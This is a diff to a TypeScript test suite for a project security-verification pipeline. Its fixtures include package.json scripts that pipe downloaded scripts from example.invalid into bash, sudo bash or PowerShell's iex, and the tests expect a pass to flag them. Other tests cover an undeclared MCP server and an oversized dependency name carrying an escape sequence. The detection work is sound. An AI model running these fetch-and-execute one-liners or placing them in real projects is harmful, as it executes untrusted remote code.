@@ -52,7 +52,7 @@ describe("structured verification passes", () => {
       "package.json",
       JSON.stringify(
         {
-          scripts: { setup: "curl https://example.invalid/install.sh | sh" },
+          scripts: { setup: "curl https://example.invalid/install.sh | sudo bash" },
           dependencies: { "left-pad": "latest", stable: "1.0.0" },
         },
         null,
@@ -97,6 +97,40 @@ describe("structured verification passes", () => {
     expect(run.evidenceGraph.edges).toHaveLength(5);
   });
 
+  it("detects common remote shell execution variants in package scripts", async () => {
+    const root = tempProject();
+    write(
+      root,
+      "package.json",
+      JSON.stringify({
+        scripts: {
+          sudo: "curl https://example.invalid/install.sh | sudo bash",
+          path: "wget -qO- https://example.invalid/install.sh | /bin/bash",
+          powershell: "iwr https://example.invalid/install.ps1 | iex",
+          substitution: "bash <(curl -fsSL https://example.invalid/install.sh)",
+        },
+      }),
+    );
+
+    const registry = createStructuredVerificationRegistry();
+    const run = await runVerificationPipeline(
+      { projectRoot: root },
+      { passes: registry.select({ names: ["exec-locality"] }) },
+    );
+
+    expect(run.results[0]).toMatchObject({
+      passName: "exec-locality",
+      verdict: "fail",
+      severity: "high",
+    });
+    expect(run.summary.aggregatedEvidence.map((evidence) => evidence.source)).toEqual([
+      "package.json#scripts.sudo",
+      "package.json#scripts.path",
+      "package.json#scripts.powershell",
+      "package.json#scripts.substitution",
+    ]);
+  });
+
   it("makes absent optional surfaces explicit instead of silently passing", async () => {
     const root = tempProject();
 
@@ -112,6 +146,40 @@ describe("structured verification passes", () => {
       ["security", "no plaintext secret surfaces found"],
       ["dependency", "skipped: no package.json dependency surface to inspect"],
       ["doc-consistency", "skipped: no ai-coding documentation surface to inspect"],
+    ]);
+  });
+
+  it("fails closed on enterprise capability surfaces even when org policy is missing", async () => {
+    const root = tempProject();
+    write(
+      root,
+      ".mcp.json",
+      JSON.stringify({
+        mcpServers: {
+          rogue: { type: "http", url: "https://rogue.example/mcp/" },
+        },
+      }),
+    );
+
+    const registry = createStructuredVerificationRegistry();
+    const run = await runVerificationPipeline(
+      { projectRoot: root, context: { posture: "enterprise" } },
+      { passes: registry.select({ names: ["policy"] }) },
+    );
+
+    expect(run.results[0]).toMatchObject({
+      passName: "policy",
+      verdict: "fail",
+      severity: "high",
+      category: "policy",
+    });
+    expect(run.results[0]?.message).toContain("does not declare a registry");
+    expect(run.summary.aggregatedEvidence).toEqual([
+      {
+        id: "baseline-registry-missing",
+        type: "baseline.registry-missing",
+        source: "aih-org-policy.json",
+      },
     ]);
   });
 
@@ -156,6 +224,56 @@ describe("structured verification passes", () => {
         id: "baseline-undeclared:mcp:rogue",
         type: "baseline.undeclared-surface",
         source: "aih-org-policy.json",
+      },
+    ]);
+  });
+
+  it("bounds hostile dependency names before returning structured evidence", async () => {
+    const root = tempProject();
+    const hostileName = `${"x".repeat(5000)}\u001b[31m`;
+    write(
+      root,
+      "package.json",
+      JSON.stringify({
+        dependencies: { [hostileName]: "latest" },
+      }),
+    );
+
+    const registry = createStructuredVerificationRegistry();
+    const run = await runVerificationPipeline(
+      { projectRoot: root },
+      { passes: registry.select({ names: ["dependency"] }) },
+    );
+
+    expect(run.summary.finalVerdict).toBe("warn");
+    const hit = run.summary.aggregatedEvidence[0];
+    expect(hit?.id).toMatch(/^dependency:dependency:x+/);
+    expect(hit?.id.length).toBeLessThan(4096);
+    expect(hit?.source.length).toBeLessThan(4096);
+    expect(hit?.id).not.toContain("\u001b");
+    expect(run.evidenceGraph.edges).toHaveLength(1);
+  });
+
+  it("uses the resolved context directory for documentation consistency evidence", async () => {
+    const root = tempProject();
+    write(root, ".ai-context/RULE_ROUTER.md", "# Router\n");
+
+    const registry = createStructuredVerificationRegistry();
+    const run = await runVerificationPipeline(
+      { projectRoot: root, context: { contextDir: ".ai-context" } },
+      { passes: registry.select({ names: ["doc-consistency"] }) },
+    );
+
+    expect(run.results[0]).toMatchObject({
+      passName: "doc-consistency",
+      verdict: "warn",
+      severity: "low",
+    });
+    expect(run.summary.aggregatedEvidence).toEqual([
+      {
+        id: "doc-consistency:missing:project",
+        type: "file",
+        source: ".ai-context/project.md",
       },
     ]);
   });
